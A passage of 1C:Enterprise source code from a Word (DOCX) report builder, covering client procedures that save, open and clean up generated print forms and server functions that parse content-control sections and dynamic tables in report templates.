		ДиалогСохранения.ПолноеИмяФайла = ПостроительОтчетовКлиентСервер.ДобавитьРазделительПути(КаталогФайла) + ИмяФайла;
		ДиалогСохранения.Фильтр = ""Документ Word (*.docx)|*.docx"";
		ДиалогСохранения.МножественныйВыбор = Ложь;
		ДиалогСохранения.Заголовок = ""Введите имя итоговово файла печатной формы"";
	Иначе
		ДиалогСохранения = Неопределено;
	КонецЕсли;
	
	// формируем массив скачиваемых файлов
	Файлы = Новый Массив;
	// первым идет файл печатной формы
	Файлы.Добавить(Новый ОписаниеПередаваемогоФайла(ИмяФайла, ДанныеОтчета.АдресОтчетаВХранилище));
	// для Windows скачиваем еще и фрагменты
	Если ЭтоWindows() Тогда
		Для Каждого АдресФрагмента Из ДанныеОтчета.АдресаФрагментов Цикл
			Файлы.Добавить(Новый ОписаниеПередаваемогоФайла(Строка(Новый УникальныйИдентификатор) + "".tmp"", АдресФрагмента));
		КонецЦикла;
	КонецЕсли;
	
	НачатьПолучениеФайлов(Новый ОписаниеОповещения(""СохранитьОтчетСИспользованиемРасширенияЗавершение"", ПостроительОтчетовКлиент, ДанныеОтчета),
						  Файлы, ?(ДиалогСохранения = Неопределено, КаталогФайла, ДиалогСохранения), Интерактивно);
КонецПроцедуры

// Сохранение отчета в файловую систему клиента с использованием расширеня работы с файлами - завершение
//
// Параметры
//  ПолученныеФайлы - in, массив сохраненных файлов
//  ДанныеОтчета - in, данные формировния печатной формы
Процедура СохранитьОтчетСИспользованиемРасширенияЗавершение(ПолученныеФайлы, ДанныеОтчета) Экспорт
	Рез = ПолученныеФайлы <> Неопределено И ПолученныеФайлы.Количество() > 0;
	Если Рез Тогда
		// в первом полученном файле, файл отчета, остальные фрагменты (фрагменты скачиваются только в Windows)
		ДанныеОтчета.Вставить(""ПутьКИтоговомуФайлу"", ПостроительОтчетовКлиентСервер.НормализоватьПуть(ПолученныеФайлы[0].Имя));
		Если ЭтоWindows() Тогда
			ПолученныеФайлы.Удалить(0);
			// если Windows, то преобразуем массив адресов фрагментов в хранилище, 
			// в соответствие, ключ - адрес в хранилище, значение - путь к файлу
			АдресаФрагментов = Новый Соответствие;
			Для Каждого ПолученныйФайл Из ПолученныеФайлы Цикл
				АдресаФрагментов.Вставить(ПолученныйФайл.Хранение, ПостроительОтчетовКлиентСервер.НормализоватьПуть(ПолученныйФайл.Имя));
				УдалитьИзВременногоХранилища(ПолученныйФайл.Хранение);
			КонецЦикла;
			ДанныеОтчета.Вставить(""АдресаФрагментов"", АдресаФрагментов);
		КонецЕсли;
	КонецЕсли;
	
	ОбработчикРезультата = Неопределено;
	Если ДанныеОтчета.Свойство(""ОбработчикРезультата"", ОбработчикРезультата) И ОбработчикРезультата <> Неопределено Тогда
		ВыполнитьОбработкуОповещения(ОбработчикРезультата, Рез);
	КонецЕсли;
КонецПроцедуры

// Сохранение отчета в файловую систему клиента без использования расширеня работы с файлами (обработчик результата не вызывается,
// т.к. в веб-клиенте код на встроенном языке продолжает выполнение, не дожидаясь окончания загрузки файла с помощью функции ПолучитьФайл)
//
// Параметры
//  ДанныеОтчета - in, данные формировния печатной формы
Процедура СохранитьОтчетБезИспользованияРасширения(ДанныеОтчета)
	ИмяФайла = """";
	// если расширение не подключено
	ПутьДляСохранения = """";
	Если ДанныеОтчета.Свойство(""ПутьДляСохранения"", ПутьДляСохранения) И ЗначениеЗаполнено(ПутьДляСохранения) Тогда
		КаталогФайла = """";
		// если путь для сохранения передан, то получаем каталог и имя файла из пути
		ПостроительОтчетовКлиентСервер.ПолучитьКаталогИИмяФайла(ПостроительОтчетовКлиентСервер.НормализоватьПуть(ПутьДляСохранения), КаталогФайла, ИмяФайла);
	КонецЕсли;
	// если имя файла еще не заполнено, то формируем его
	Если ПустаяСтрока(ИмяФайла) Тогда
		ИмяФайла = СформироватьИмяФайлаОтчета(ДанныеОтчета.ИмяОтчета, ""docx"");
	КонецЕсли;
	
	ПолучитьФайл(ДанныеОтчета.АдресОтчетаВХранилище, ИмяФайла, Истина);
КонецПроцедуры

// Удаление файлов, скачанных для обработки секций из файлов
//
// Параметры
//  ДанныеОтчета - in, данные формировния печатной формы
//
Процедура УдалитьФайлыФрагментов(ДанныеОтчета) Экспорт
	Если ДанныеОтчета.Свойство(""РасширениеПодключено"") И ДанныеОтчета.РасширениеПодключено И ДанныеОтчета.Свойство(""АдресаФрагментов"") Тогда
		Для Каждого Фрагмент Из ДанныеОтчета.АдресаФрагментов Цикл
			УдалитьФайлы(Фрагмент.Значение);
		КонецЦикла;
	КонецЕсли;
КонецПроцедуры

// Сохранение и открытие печатной формы
//
// Параметры
//  ДанныеОтчета - in, данные формировния печатной формы, должны быть получены в результате формирования печатной формы на сервере 
//		(ПостроительОтчетовСервер.СформироватьОтчет). Может содержать следующие дополнительные параметры, влияющие на процесс 
//		формирование печатной формы (параметры не имеют значения в веб-клиенте, при неустановленном расширении работы с файлами):
//			ПутьДляСохранения - путь к файлу или каталогу, по которому необходимо сохранить печатную форму
//			Интерактивно - интерактивный режим, в котором пользователю показывается диалог сохранения
//
Процедура ОткрытьОтчет(ДанныеОтчета) Экспорт
	СохранитьОтчет(ДанныеОтчета, Новый ОписаниеОповещения(""ОткрытьОтчетЗавершение"", ПостроительОтчетовКлиент, ДанныеОтчета));
КонецПроцедуры

// Сохранение и открытие печатной формы - завершение
//
// Параметры
//  Результат - in, результат сохранения печатной формы в файловую систему клиента
//  ДанныеОтчета - in, данные формировния печатной формы
//
Процедура ОткрытьОтчетЗавершение(Результат, ДанныеОтчета) Экспорт
	Если Результат Тогда
		MSWord = ОбработатьОтчетВMSWord(ДанныеОтчета);
		Если MSWord <> Неопределено Тогда
			MSWord.Application.Visible = Истина;
			MSWord.Application.WindowState = 2;
			MSWord.Application.WindowState = 1;
		КонецЕсли;
		Сообщить(""Печатная форма сформирована и сохранена """""" + ДанныеОтчета.ПутьКИтоговомуФайлу + """"""!"");
	Иначе
		Сообщить(""Не удалось получить файл печатной формы!"");
	КонецЕсли;
	УдалитьФайлыФрагментов(ДанныеОтчета);
КонецПроцедуры

#КонецОбласти
"}
},
{0,
{"ПостроительОтчетовСервер",0,0,"","// МОДУЛЬ ПОСТРОИТЕЛЬ ОТЧЕТОВ СЕРВЕР
// Серверная часть построителя отчетов.
// В модуле осуществляется обработка текста шаблона отчета и замена тегов разметки
// на сформированные в результате их обработки фрагменты документа

#Область КонстантыТиповСекции

Функция констНеизвестнаяСекция()
	Возврат -1;
КонецФункции

Функция констСекция()
	Возврат 0;
КонецФункции

Функция констПовторяемаяСекция()
	Возврат 1;
КонецФункции

Функция констНеобязательнаяСекция()
	Возврат 2;
КонецФункции

Функция констГруппаВзаимозаменяемыхСекций()
	Возврат 3;
КонецФункции

Функция констВзаимозаменяемаяСекция()
	Возврат 4;
КонецФункции

Функция констДинамическаяТаблица()
	Возврат 5;
КонецФункции

Функция констКолонка()
	Возврат 6;
КонецФункции

Функция констПеременная()
	Возврат 7;
КонецФункции

Функция констОбъединить()
	Возврат 8;
КонецФункции

Функция констПодстановка()
	Возврат 9;
КонецФункции

Функция констОпределениеПодстановки()
	Возврат 10;
КонецФункции

Функция констКоммент()
	Возврат 11;
КонецФункции

Функция констНачатьЗаново()
	Возврат 12;
КонецФункции

Функция констИзФайла()
	Возврат 13;
КонецФункции

Функция констЯчейка()
	Возврат 14;
КонецФункции

// Определяет идентификатор типа секции (число) по строке
//
// Параметры
//  ТипСекции - in, строковое наименование типа секции
//
// Возвращаемое значение
//  Идентификатор типа секции
//
Функция ТипСекцииПоСтроке(ТипСекции) Экспорт 
	Если ТипСекции = ""Секция"" Тогда
		Возврат констСекция();
	ИначеЕсли ТипСекции = ""ПовторяемаяСекция"" Тогда
		Возврат констПовторяемаяСекция();
	ИначеЕсли ТипСекции = ""НеобязательнаяСекция"" Тогда
		Возврат констНеобязательнаяСекция();
	ИначеЕсли ТипСекции = ""ГруппаВзаимозаменяемыхСекций"" Тогда
		Возврат констГруппаВзаимозаменяемыхСекций();
	ИначеЕсли ТипСекции = ""ВзаимозаменяемаяСекция"" Тогда
		Возврат констВзаимозаменяемаяСекция();
	ИначеЕсли ТипСекции = ""ДинамическаяТаблица"" Тогда
		Возврат констДинамическаяТаблица();
	ИначеЕсли ТипСекции = ""Колонка"" Тогда
		Возврат констКолонка();
	ИначеЕсли ТипСекции = ""Переменная"" Тогда
		Возврат констПеременная();
	ИначеЕсли ТипСекции = ""Объединить"" Тогда
		Возврат констОбъединить();
	ИначеЕсли ТипСекции = ""НачатьЗаново"" Тогда
		Возврат констНачатьЗаново();
	ИначеЕсли ТипСекции = ""ОпределениеПодстановки"" Тогда
		Возврат констОпределениеПодстановки();
	ИначеЕсли ТипСекции = ""Подстановка"" Тогда
		Возврат констПодстановка();
	ИначеЕсли ТипСекции = ""Коммент"" Тогда
		Возврат констКоммент();
	ИначеЕсли ТипСекции = ""ИзФайла"" Тогда
		Возврат констИзФайла();
	ИначеЕсли ТипСекции = ""Ячейка"" Тогда
		Возврат констЯчейка();
	Иначе
		Возврат констНеизвестнаяСекция();
	КонецЕсли;
КонецФункции

#КонецОбласти

#Область СервисныеПроцедурыИФункции

// Проверка необходимости считывать секцию на текущей итерации
//
// Параметры
//  ИтерацияПостроителя - in, текст файла связей
//  ИтерацияСекции - in, идентификатор искомого связанного файла
//
// Возвращаемое значение
//  Истина, если секция должна обрабатываться на текущей итерации или безитерационная обработка
//
Функция СчитыватьСекцию(Знач ИтерацияПостроителя, Знач ИтерацияСекции)
	Возврат (ИтерацияПостроителя < 0) Или (ИтерацияПостроителя = ИтерацияСекции) Или (ИтерацияПостроителя = 0 И ИтерацияСекции > 0);
КонецФункции

// Получение имени связанного файла из текста файла связей
//
// Параметры
//  СвязиДокумента - in, текст файла связей
//  ИД - in, идентификатор искомого связанного файла
//
// Возвращаемое значение
//  Идентификатор типа секции
//
Функция ПолучитьИмяФайлаСодержимого(СвязиДокумента, ИД)
	Начало = Найти(СвязиДокумента, ""<Relationship Id="""""" + ИД + """""" "");
	Если Начало > 0 Тогда
		Начало = ПостроительОтчетовКлиентСервер.НайтиНачинаяС(СвязиДокумента, "" Target="""""", Начало) + 9;
		Возврат Сред(СвязиДокумента, Начало, ПостроительОтчетовКлиентСервер.НайтиНачинаяС(СвязиДокумента, """""""", Начало) - Начало);
	КонецЕсли;
	
	Возврат Неопределено;
КонецФункции

#КонецОбласти

#Область ПроцедурыИФункцииСчитыванияШаблонаСРазметкойЭлементамиУправленияСодержимым

// Получение идентификатора секции
//
// Параметры:
//  ТекстСекции - in, строка, содержащая определение секции
//  ИскатьС - in, целое, позиция в сСтрока, с которой необходимо начинать поиск
//  ИскатьПо - in, целое, позиция в сСтрока, до которой необходимо выполнять поиск
//
// Возвращаемое значение:
//  строка - идентификатор секции
//
Функция ПолучитьИдентификаторСекции(ТекстСекции, ИскатьС = 0, ИскатьПо = 0)
	сИдентификатор = ПостроительОтчетовКлиентСервер.ПолучитьЗначениеАтрибутаWMLТега(ТекстСекции, ""<w:id w:val="""""", ИскатьС, ИскатьПо);
	// делается так, потому что MS Word иногда сохраняет в файл идентификаторы как идентификатор минус максимальное неотрицательное число
	Если СтрНачинаетсяС(сИдентификатор, ""-"") Тогда
		сИдентификатор = Формат(4294967296 + Число(сИдентификатор), ""ЧГ=0"");
	КонецЕсли;
	
	Возврат сИдентификатор;
КонецФункции

// Получение идентификатора секции ""Колонка""
//
// Параметры:
//  Ячейка - строка - in, строка, содержащая определение ячейки таблицы
//
// Возвращаемое значение:
//  строка - идентификатор секции ""Колонка""
//
Функция ПолучитьИдентификаторСекцииКолонка(Знач Ячейка)
	НачалоСекцииКолонка = Найти(Ячейка, ""<w:tag w:val=""""Колонка""""/>"");
	Если НачалоСекцииКолонка > 0 Тогда
		НачалоСвойств = ПостроительОтчетовКлиентСервер.НайтиСправа(Ячейка, ""<w:sdtPr>"", НачалоСекцииКолонка); 
		КонецСвойств = ПостроительОтчетовКлиентСервер.НайтиНачинаяС(Ячейка, ""</w:sdtPr>"", НачалоСекцииКолонка);
		Возврат ПолучитьИдентификаторСекции(Ячейка, НачалоСвойств, КонецСвойств);
	КонецЕсли;
	
	Возврат """";
КонецФункции

// Обрабатывает ячейку шаблона динамической таблицы 
// проверяем есть ли в ячейке тэг колонка (<ns0:Колонка>), 
// если есть определяем его атрибуты и сохраняем их в тзТаблицаОбластей
// Обрамляем ячейку скобками секции ""<ns0:Ячейка"", в атрибуты секции записываем
// номер области с которой начинается ячейка и количество занимаемых областей
//
// тзТаблицаОбластей - in out, таблица областей для записи атрибутов
// цНомерОбласти - in out, номер обрабатываемой области
//
// 
// Параметры:
//  сЯчейка - строка - in, строка, содержащая ячейку таблицы
//  тзТаблицаОбластей - ТаблицаЗначений - in, таблица с атрибутами и ширинами областей
//  цНомерОбласти - число - in/out, номер обрабатываемой области
//
// Возвращаемое значение:
//  строка - обрамленная скобками секции исходная ячейка
// 
Функция ВставитьСекциюЯчейка(сЯчейка, тзТаблицаОбластей, цНомерОбласти, ЗначенияАтрибутов, цИтерация)
	// определяем сколько областей разметки занимает столбец
	цЧислоЗанимаемыхОбластей = ПолучитьЧислоЗанимаемыхОбластей(сЯчейка);
	цПоследняяЗанимаемаяОбласть = цНомерОбласти + цЧислоЗанимаемыхОбластей - 1;
	сИдентификатор = Строка(Новый УникальныйИдентификатор);
	сРез = ""<w:sdt><w:sdtPr><w:tag w:val=""""Ячейка""""/><w:id w:val="""""" + сИдентификатор + """"""/></w:sdtPr><w:sdtContent>"";
	ЗначенияАтрибутов.Вставить(сИдентификатор, Новый Структура(""Наименование, Данные, Итерация"", Строка(цНомерОбласти), Строка(цПоследняяЗанимаемаяОбласть), цИтерация));
	// проверяем есть ли секция колонка
	// ищем тэг колонки
	сИдентификатор = ПолучитьИдентификаторСекцииКолонка(сЯчейка);
	// если тэг колонки задан для обрабатываемой ячейки, то определяем его атрибуты
	Если Не ПустаяСтрока(сИдентификатор) Тогда
		// получаем атрибуты секции
		Атрибуты = ЗначенияАтрибутов.Получить(сИдентификатор);
		// если секцию необходимо обрабатывать на текущей итерации, то разбираем
		Если СчитыватьСекцию(цИтерация, Число(ПостроительОтчетовКлиентСервер.ПолучитЗначениеАтрибутаСекции(Атрибуты, ""Итерация"", 1))) Тогда
			сНаименованиеУсловия = ПостроительОтчетовКлиентСервер.ПолучитЗначениеАтрибутаСекции(Атрибуты, ""Условие"");
			цФиксированнаяШирина = ПостроительОтчетовКлиентСервер.ПолучитЗначениеАтрибутаСекции(Атрибуты, ""ФиксированнаяШирина"", -1);
			
			// устанавливаем атрибуты для секции, если они были заданы
			Если сНаименованиеУсловия <> """" Или цФиксированнаяШирина <> -1 Тогда
				// Пробегаем в тзТаблицаОбластей по атрбутам всех областей, которые перекрываются данной ячейкой
				Пока цНомерОбласти <= цПоследняяЗанимаемаяОбласть Цикл
					// если атрибуты области были заданы ранее, то выдаем ошибку
					Если Не ПустаяСтрока(тзТаблицаОбластей[цНомерОбласти].УсловиеВидимости) Или
						 тзТаблицаОбластей[цНомерОбласти].ФиксированнаяШирина <> -1 Тогда 
						ВызватьИсключение ""Ошибка шаблона отчета. Для колонки не допустимо двойное определение."";
					КонецЕсли;
					тзТаблицаОбластей[цНомерОбласти].УсловиеВидимости = сНаименованиеУсловия;
					тзТаблицаОбластей[цНомерОбласти].ФиксированнаяШирина = цФиксированнаяШирина;
					цНомерОбласти = цНомерОбласти + 1;
				КонецЦикла;
			Иначе 
				цНомерОбласти = цНомерОбласти + цЧислоЗанимаемыхОбластей;
			КонецЕсли;
			// ! откопировано из разборщика XML, тут надо подругому, но т.к. закоментированно, не переделываю, пока оставил как было
			// удаляем тэг колонки // уже не удаляем ??для обратной конвертации из структуры в шаблон
			//цИндексКонца = НайтиНачинаяС(сЯчейка, "">"", цИндексНачалаСекцииКолонка);
			//сТэгКолонка = Сред(сЯчейка, цИндексНачалаСекцииКолонка, цИндексКонца - цИндексНачалаСекцииКолонка + 1);
			//сНовЯчейка = СтрЗаменить(сЯчейка, сТэгКолонка, """");
			//// удаляем атрибуты, необходимо для дальнейшего переформирования фалйла settings
			//Если ЗначениеЗаполнено(Атрибуты) Тогда
			//	ЗначенияАтрибутов.Удалить(сИдентификатор);
			//КонецЕсли;
		КонецЕсли;
	Иначе 
		цНомерОбласти = цНомерОбласти + цЧислоЗанимаемыхОбластей;
	КонецЕсли;
	
	//сРез = сРез + сНовЯчейка + ""</w:sdtContent></w:sdt>""; 
	сРез = сРез + сЯчейка + ""</w:sdtContent></w:sdt>""; 
	
	Возврат сРез;
КонецФункции

// Считывает во внутреннюю структуру построителя отчета секцию ""динамическая таблица""
//
// Параметры:
//  сТекст - строка - in, обрабатываемый фрагмент текста, содержащий таблицу
//  СекцияДТ - структура - in/out, структура, описывающая данную динамическую таблицу
//
Процедура СчитатьСтруктуруДинамическойТаблицы(сСекцияТаблица, СекцияДТ, ЗначенияАтрибутов, цИтерация)
	// Считываем заголовок таблицы
	// ищем первый тэг секции разметки таблицы <w:tblGrid>, и до этой позиции оставляем все без изменений
	цНачалоРазметкиТаблицы = Найти(сСекцияТаблица, ""<w:tblGrid>"");
	сЗаголовокТаблицы = Лев(сСекцияТаблица, цНачалоРазметкиТаблицы - 1);
	// эту часть будем называть заголовок таблицы, сохраним ее в реквизит структуры СекцияДТ 
	СекцияДТ.Вставить(""ЗаголовокТаблицы"", сЗаголовокТаблицы);
	
	// Парсим секцию разметки таблицы
	// цНачалоРазметкиТаблицы = цНачалоРазметкиТаблицы + СтрДлина(""<w:tblGrid>"");
	// ищем конец секции разметки таблицы </w:tblGrid>
	цКонецРазметкиТаблицы = ПостроительОтчетовКлиентСервер.НайтиНачинаяС(сСекцияТаблица, ""</w:tblGrid>"", цНачалоРазметкиТаблицы);
	// на основе данных секции <w:tblGrid> (секции разметки таблицы)
	// формируем массив ширин областей разметки таблицы
	сРазметкаКолонок = Сред(сСекцияТаблица,
  							 цНачалоРазметкиТаблицы,
   							 цКонецРазметкиТаблицы - цНачалоРазметкиТаблицы + СтрДлина(""</w:tblGrid>""));
	тзТаблицаОбластей = ФормированиеТаблицыОбластей(сРазметкаКолонок);
	СекцияДТ.Вставить(""РазметкаКолонок"", сРазметкаКолонок);// ??для обратной конвертации из структуры в шаблон

	цИндексНачалаТелаТаблицы = цКонецРазметкиТаблицы + СтрДлина(""</w:tblGrid>"");
	
	// Обрабатываем тело таблицы
	// тело таблицы - все, что после ""</w:tblGrid>""
	// (начинаестя с тэга <w:tr> или с тэга разметки отчета(тега какой-либо секции))
	сОстатокТаблицы = Сред(сСекцияТаблица,	цИндексНачалаТелаТаблицы);
	
	// удаляем закрывающие тэги секции ""Колонка"" // уже не удаляем ??для обратной конвертации из структуры в шаблон
	// сОстатокТаблицы = СтрЗаменить(сОстатокТаблицы, ""</ns0:Колонка>"", """");
	сТелоТаблицы = """";
	цИндексНачалаСтроки = 1;
	// ищем конец строки таблицы - тэг </w:tr>
	цИндексКонцаСтроки = Найти(сОстатокТаблицы, ""</w:tr>"");
	
	// бежим по строкам таблицы
	Пока цИндексКонцаСтроки > 0 Цикл
		сОстатокСтрокиТаблицы = Лев(сОстатокТаблицы, цИндексКонцаСтроки + СтрДлина(""</w:tr>"") - 1);
		сОстатокТаблицы = Сред(сОстатокТаблицы, цИндексКонцаСтроки + СтрДлина(""</w:tr>""));
		
		// определяем индекс начала первой ячейки в строке
		цИндексНачалаЯчейки = Найти(сОстатокСтрокиТаблицы, ""<w:tc"");
		сСтрокаТаблицы = """";
		
		// ищем конец ячейки - тэг </w:tc>
		цИндексКонцаЯчейки = Найти(сОстатокСтрокиТаблицы, ""</w:tc>"") + СтрДлина(""</w:tс>"") - 1;
		
		// бежим по ячейкам строки
		цНомерОбласти = 0;
		Пока цИндексНачалаЯчейки > 0 Цикл
			сСтрокаТаблицы = сСтрокаТаблицы + Лев(сОстатокСтрокиТаблицы, цИндексНачалаЯчейки - 1); 
			сЯчейка = Сред(сОстатокСтрокиТаблицы, цИндексНачалаЯчейки, цИндексКонцаЯчейки - цИндексНачалаЯчейки + 1);
			сОстатокСтрокиТаблицы = Сред(сОстатокСтрокиТаблицы, цИндексКонцаЯчейки + 1);
			
			// получаем атрибуты столбца и сохраняем их в тзТаблицаОбластей
			сНоваяЯчейка = ВставитьСекциюЯчейка(сЯчейка, тзТаблицаОбластей, цНомерОбласти, ЗначенияАтрибутов, цИтерация);
			сСтрокаТаблицы = сСтрокаТаблицы + сНоваяЯчейка;
			
			// ищем начало и конец следующей ячейки - тэги <w:tc и </w:tc>
			цИндексНачалаЯчейки = Найти(сОстатокСтрокиТаблицы, ""<w:tc"");
			цИндексКонцаЯчейки = Найти(сОстатокСтрокиТаблицы, ""</w:tc>"") + СтрДлина(""</w:tс>"") - 1;
		КонецЦикла;
		сТелоТаблицы = сТелоТаблицы + сСтрокаТаблицы + сОстатокСтрокиТаблицы;
		
		// ищем конец строки таблицы - тэг </w:tr>
		цИндексКонцаСтроки = Найти(сОстатокТаблицы, ""</w:tr>"");
	КонецЦикла;
    сТелоТаблицы = сТелоТаблицы + сОстатокТаблицы;
	
	СекцияДТ.Вставить(""ТаблицаОбластей"", тзТаблицаОбластей);
	
	АвтоВысотаТаблицы(сТелоТаблицы);
    СекцияДТ.Вставить(""СодержимоеСекции"", СчитатьСтруктуруШаблонаСЭлементамиУправленияСодержимым(сТелоТаблицы, ЗначенияАтрибутов, цИтерация));
КонецПроцедуры

// Считывает структуру секции
//
// Параметры:
//  сТекстСекции - строка - in, строка, содержащая секцию
//  ЗначенияАтрибутов - соответствие - in, содержит значения атрибутов секций
//  цИтерация - целое число - in, итерация построителя 
//  СтруктураШаблона - структура - out, итоговая структура для добавления разобранной секции
//
// Возвращаемое значение:
//  целое число - индекс конца элемента управления содержимым
//
Функция СчитатьСекцию(Знач сТекстСекции, ЗначенияАтрибутов, цИтерация, СтруктураШаблона)
	// получаем начало содержимого элемента управления содержимым
	цНачалоСодержимого = ПостроительОтчетовКлиентСервер.НайтиНачалоТэга(сТекстСекции, ""w:sdtContent"");
	// ищем свойства элемента управления содержимым
	сТипСекции = ПостроительОтчетовКлиентСервер.ПолучитьЗначениеАтрибутаWMLТега(сТекстСекции, ""<w:tag w:val="""""", 1, цНачалоСодержимого);
	сИдентификатор = ПолучитьИдентификаторСекции(сТекстСекции, 1, цНачалоСодержимого);
	// получаем содержимое элемента управления содержимым
	цНачалоСодержимого = цНачалоСодержимого + 14;
	Если Сред(сТекстСекции, цНачалоСодержимого - 1, 1) = ""/"" Тогда
		цНачалоСодержимого = цНачалоСодержимого + 1;
		// сдвигаем конец секции на 15 вперед, потому что если секция не будет обработана, то конец будет сдвинут на 15 назад, для обработки содержимого секции
		цКонецСодержимого = цНачалоСодержимого + 15;
		сТелоСекции = """";
		цКонецСекции = цНачалоСодержимого + 8;
	Иначе
		цКонецСодержимого = ПостроительОтчетовКлиентСервер.НайтиИндексКонцаТэга(сТекстСекции, цНачалоСодержимого, ""<w:sdtContent>"", ""</w:sdtContent>"");
		сТелоСекции = Сред(сТекстСекции, цНачалоСодержимого, цКонецСодержимого - цНачалоСодержимого - 15);
		цКонецСекции = цКонецСодержимого + 8;
	КонецЕсли;
	
	// получаем идентификатор типа секции
	цТипСекции = ТипСекцииПоСтроке(сТипСекции);
	// считываем секции известного типа
	СчитыватьСекцию = цТипСекции <> констНеизвестнаяСекция();
	Если СчитыватьСекцию Тогда
		// получаем атрибуты секции
		Атрибуты = ЗначенияАтрибутов.Получить(сИдентификатор);
		// если секцию необходимо обрабатывать на текущей итерации, то разбираем
		СчитыватьСекцию = СчитыватьСекцию(цИтерация, Число(ПостроительОтчетовКлиентСервер.ПолучитЗначениеАтрибутаСекции(Атрибуты, ""Итерация"", 1)));
		Если СчитыватьСекцию Тогда
			сНаименованиеСекции = """";
			сДанные = """";
			Если цТипСекции = констПовторяемаяСекция() Или цТипСекции = констЯчейка() Тогда
				сНаименованиеСекции = ПостроительОтчетовКлиентСервер.ПолучитЗначениеАтрибутаСекции(Атрибуты, ""Наименование"");
				сДанные = ПостроительОтчетовКлиентСервер.ПолучитЗначениеАтрибутаСекции(Атрибуты, ""Данные"");
			ИначеЕсли цТипСекции = констНеобязательнаяСекция() Тогда
				сНаименованиеСекции = ПостроительОтчетовКлиентСервер.ПолучитЗначениеАтрибутаСекции(Атрибуты, ""Условие"");
			ИначеЕсли цТипСекции = констОпределениеПодстановки() Тогда
				сНаименованиеСекции = ПостроительОтчетовКлиентСервер.ПолучитЗначениеАтрибутаСекции(Атрибуты, ""Наименование"");
			ИначеЕсли цТипСекции = констКолонка() Тогда
				сНаименованиеСекции = ПостроительОтчетовКлиентСервер.ПолучитЗначениеАтрибутаСекции(Атрибуты, ""Условие"");
				сДанные = ПостроительОтчетовКлиентСервер.ПолучитЗначениеАтрибутаСекции(Атрибуты, ""ФиксированнаяШирина"");
				Если Не ПустаяСтрока(сДанные) Тогда
					сДанные = ""фиксш"";
				КонецЕсли;
			КонецЕсли;

			Секция = Новый Структура;
			Секция.Вставить(""цТипСекции"", цТипСекции); 
			Секция.Вставить(""сТипСекции"", сТипСекции); 
			Секция.Вставить(""сНаименованиеСекции"", сНаименованиеСекции); 
			Секция.Вставить(""сДанные"", сДанные); 
			
			Если цТипСекции = констДинамическаяТаблица() Тогда
				СчитатьСтруктуруДинамическойТаблицы(сТелоСекции, Секция, ЗначенияАтрибутов, цИтерация);
			Иначе
				Секция.Вставить(""СодержимоеСекции"", СчитатьСтруктуруШаблонаСЭлементамиУправленияСодержимым(сТелоСекции, ЗначенияАтрибутов, цИтерация));
			КонецЕсли;
			
			СтруктураШаблона.Добавить(Секция);
			
			// удаляем атрибуты, необходимо для дальнейшего переформирования фалйла settings
			Если ЗначениеЗаполнено(Атрибуты) Тогда
				ЗначенияАтрибутов.Удалить(сИдентификатор);
			КонецЕсли;
		КонецЕсли;
	КонецЕсли;
	
	// если неизвестная секция или не соответствующая итерация, то обрабатываем как текст
	Если Не СчитыватьСекцию Тогда
		СтруктураШаблона.Добавить(Лев(сТекстСекции, цНачалоСодержимого - 1)); 
		СтруктураСодержимого = СчитатьСтруктуруШаблонаСЭлементамиУправленияСодержимым(сТелоСекции, ЗначенияАтрибутов, цИтерация);
		Если ТипЗнч(СтруктураСодержимого) = Тип(""Массив"") Тогда
			Для Каждого СтрокаСодержимого Из СтруктураСодержимого Цикл
				СтруктураШаблона.Добавить(СтрокаСодержимого);
			КонецЦикла;
		ИначеЕсли ЗначениеЗаполнено(СтруктураСодержимого) Тогда
			СтруктураШаблона.Добавить(СтруктураСодержимого);
		КонецЕсли;
		цКонецСекции = цКонецСодержимого - 15;
	КонецЕсли;
	
	Возврат цКонецСекции;
КонецФункции

// Считывает шаблон размеченого с помощью элементов управления содержимых
Функция СчитатьСтруктуруШаблонаСЭлементамиУправленияСодержимым(Знач сТекст, ЗначенияАтрибутов, Итерация)
	Рез = Новый Массив;
	НачалоСекции = Найти(сТекст, ""<w:sdt>"");
	Пока НачалоСекции > 0 Цикл
		Если НачалоСекции <> 1 Тогда
			Рез.Добавить(Лев(сТекст, НачалоСекции - 1));
		КонецЕсли;
		// ищем конец секции
		сТекст = Сред(сТекст, НачалоСекции);
		КонецСекции = СчитатьСекцию(сТекст, ЗначенияАтрибутов, Итерация, Рез);
		
		сТекст = Сред(сТекст, КонецСекции);
		// ищем начало следующей секции
		НачалоСекции = Найти(сТекст, ""<w:sdt>"");
	КонецЦикла;
	
	Если Рез.Количество() > 0 Тогда
		Если Не ПустаяСтрока(сТекст) Тогда 
			Рез.Добавить(сТекст);
		КонецЕсли;
		
		Возврат Рез;
	Иначе 
		Возврат сТекст;
	КонецЕсли;
КонецФункции

#КонецОбласти

#Область ПроцедурыИФункцииСчитыванияШаблонаВСобственномФормате

Функция ПреобразоватьХМЛВоВнутреннююСтруктуру(ЧтениеХМЛ, Знач ТипПредыдущегоУзлаХМЛ)
	
	мРез = Новый Массив();
	
	Пока ЧтениеХМЛ.Прочитать() Цикл
		
		Если ЧтениеХМЛ.ЛокальноеИмя = ""ШаблонОтчета"" Тогда
			Продолжить;
		КонецЕсли;
		
		Если ЧтениеХМЛ.ТипУзла = ТипУзлаXML.Текст Или ЧтениеХМЛ.ТипУзла = ТипУзлаXML.СекцияCDATA Тогда
			Возврат ЧтениеХМЛ.Значение;
		ИначеЕсли ЧтениеХМЛ.ТипУзла = ТипУзлаXML.Ничего Тогда
			Продолжить;
		КонецЕсли;

		Если ЧтениеХМЛ.ЛокальноеИмя = ""ТекстОтчета"" Тогда
			Если ЧтениеХМЛ.ТипУзла = ТипУзлаXML.НачалоЭлемента Тогда
				КусокТекста = ПреобразоватьХМЛВоВнутреннююСтруктуру(ЧтениеХМЛ, ЧтениеХМЛ.ТипУзла);
			ИначеЕсли ЧтениеХМЛ.ТипУзла = ТипУзлаXML.КонецЭлемента Тогда
				мРез.Добавить(КусокТекста);
			КонецЕсли;
		ИначеЕсли ЧтениеХМЛ.ЛокальноеИмя = ""Секция"" Тогда
			Если ЧтениеХМЛ.ТипУзла = ТипУзлаXML.НачалоЭлемента Тогда
				Секция = Новый Структура(""сТипСекции, цТипСекции, сНаименованиеСекции, сДанные, СодержимоеСекции"", """", 0, """", """", """");
			ИначеЕсли ЧтениеХМЛ.ТипУзла = ТипУзлаXML.КонецЭлемента Тогда
				мРез.Добавить(Секция);
			КонецЕсли;
//		ИначеЕсли ЧтениеХМЛ.ЛокальноеИмя = ""СодержимоеСекции"" Тогда
//			Если ЧтениеХМЛ.ТипУзла = ТипУзлаXML.НачалоЭлемента Тогда
